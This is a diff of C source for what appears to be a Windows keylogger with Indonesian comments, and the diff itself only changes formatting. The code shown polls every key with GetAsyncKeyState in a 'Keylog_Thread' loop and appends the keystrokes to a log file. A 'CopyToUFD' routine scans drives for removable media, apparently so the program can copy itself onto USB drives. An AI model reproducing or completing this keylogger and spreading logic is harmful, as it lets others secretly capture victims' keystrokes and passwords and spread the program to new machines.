@@ -145,12 +145,12 @@ DWORD WINAPI Keylog_Thread(LPVOID Param)
     fputs("\r\n",file);
 
     short character;
-    while(1)
+    while (1)
     {
         Sleep(10); // Mencegah 100% CPU Usage
-        for(character=8; character<=222; character++)
+        for (character=8; character<=222; character++)
         {
-            if(GetAsyncKeyState(character)==-32767)
+            if (GetAsyncKeyState(character) == -32767)
             {
                 FILE *file;
                 file=fopen(szLog, "a+");
@@ -175,7 +175,7 @@ DWORD WINAPI Keylog_Thread(LPVOID Param)
                     }
                     else
                     {
-                        switch(character)
+                        switch (character)
                         {
                         case VK_SPACE:
                         	// ini aslinya
@@ -367,9 +367,9 @@ void CopyToUFD(void)
     char *drv[10] = {"A:", "B:", "C:", "D:", "E:",
                      "F:", "G:", "H:", "I:", "J:"};
 
-    for(int i=0; i < 10; i++)
+    for (int i=0; i < 10; i++)
     {
-        if(GetDriveType(drv[i]) == DRIVE_REMOVABLE)
+        if (GetDriveType(drv[i]) == DRIVE_REMOVABLE)
         {
         	// ini aslinya
             //strncpy(szDest, drv[i], strln(drv[i]));
